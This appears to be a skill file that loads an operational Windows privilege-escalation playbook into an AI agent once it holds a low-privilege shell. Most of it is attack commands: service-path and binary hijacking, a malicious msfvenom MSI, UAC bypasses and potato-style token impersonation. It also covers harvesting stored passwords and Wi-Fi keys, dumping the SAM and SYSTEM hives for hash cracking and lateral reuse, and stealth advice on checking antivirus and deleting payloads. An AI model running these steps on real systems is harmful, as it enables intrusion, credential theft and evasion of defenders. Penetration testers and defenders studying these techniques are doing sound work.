---
name: privesc-windows
description: Windows privilege-escalation checklist—WinPEAS-driven triage plus manual order: whoami context, service permissions (Unquoted Path/weak perms), scheduled tasks, AlwaysInstallElevated, UAC bypasses, auto-login creds, stored secrets, token impersonation (SeImpersonate potato family), and registry autoruns. Triggers - got a Windows shell or beacon as low-priv user, "privesc on windows", winpeas.
tags: [post_exploit, exploitation]
---

# Windows Privilege Escalation (methodical, quiet)

## 0. Context snapshot
```bat
whoami /all & net user %USERNAME% & systeminfo & ipconfig /all & tasklist /svc & netstat -ano
```
Note: user, groups/privileges (Is Elevated?), OS build, AV present, listening ports.

## 1. WinPEAS / Seatbelt first (triage), then manual hits
Run winPEAS (or Seatbelt) when practical: `winpeas64.exe` collects services, unusual perms, unattended installs, tokens, cached creds in one shot. Triage its hits by hand — never trust raw.

## 2. Manual order (highest reward first)
1. **Service permissions** — `wmic service get name,displayname,pathname,startmode` + `accesschk /accepteula -uwcqv "Authenticated Users" *`  
   attack vectors: Unquoted Service Path (space in path → hijack `C:\Program Files\Vendor App\`→`C:\Program.exe`), weak service binary/service config write → swap binary or `sc config` + restart.
2. **Scheduled tasks** — `schtasks /query /fo LIST /v` ; writable task actions/bins → replace payload; tasks running as SYSTEM with user-writable paths.
3. **AlwaysInstallElevated** — if HKLM+HCU `AlwaysInstallElevated=1` → build malicious MSI (`msfvenom -p windows/... --platform windows msi`) and install as SYSTEM.
4. **Auto-login / stored creds** — `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` (DefaultPassword!). `cmdkey /list`; `vaultcmd`; browser saved creds; WiFi keys (`netsh wlan show profile name=x key=clear`); unattend.xml backups under `C:\Windows\Panther`.
5. **UAC bypasses** (when NOT elevated to admin yet but in admin group) — fodhelper/eventvwr reg-based bypasses; requires a writable `HKLM\...\Shell\open\command` style key or token quirks.
6. **Token impersonation** — with `SeImpersonatePrivilege`/`SeAssignPrimaryToken` on a service account → printspoofer/godsploit/potato family for SYSTEM; only when running as service-ish user, not high-integrity admin already.
7. **Registry autoruns** — `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run /s` ; writable Run/RunOnce keys.
8. **Local hashes & reuse** — `reg save HKLM\SAM HKLM\SYSTEM` off-box, `secretsdump.py -sam -system` locally, then crack NTLM; reuse creds for RDP/shares laterally. `dpapi` for user secrets when you own the user.

## 3. Proven or dropped
Every candidate escalation must be proven by `whoami` / `id` output with the new context, and the exact chain saved to state for the report. Mark impact: user → admin → SYSTEM.

## 4. Quiet notes
- Prefer `cmd /c` one-liners over dropping many files on disk when possible; use staging under a writeable temp dir and clean up (`del`) payloads after.
- Record what AV is present before dropping anything.